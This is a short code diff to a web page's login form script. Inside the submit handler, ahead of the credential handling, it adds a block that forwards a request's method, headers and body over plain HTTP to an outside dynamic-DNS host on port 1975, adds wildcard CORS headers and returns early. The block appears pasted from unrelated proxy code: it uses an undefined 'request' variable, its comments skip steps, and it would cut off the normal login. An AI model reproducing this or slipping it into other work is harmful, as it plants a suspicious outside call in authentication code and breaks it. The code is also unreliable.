@@ -240,6 +240,28 @@
     // ======= Submit login =======
     $('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
+
+
+    // 1. Define your base insecure URL
+    const baseUrl = "http://tgjblad.dyndns.org:1975/api/tp/online/ping";
+
+    // 4. Forward the request (includes Method like GET/POST and Headers)
+    let response = await fetch(baseUrl, {
+      method: request.method,
+      headers: request.headers,
+      body: request.body // Allows POST/PUT requests to work too
+    });
+
+    // 5. Add CORS headers to the response
+    response = new Response(response.body, response);
+    response.headers.set("Access-Control-Allow-Origin", "*");
+    response.headers.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+    response.headers.set("Access-Control-Allow-Headers", "*");
+
+    return response;
+
+
+
       const email = $('email').value.trim();
       const password = $('password').value;
 
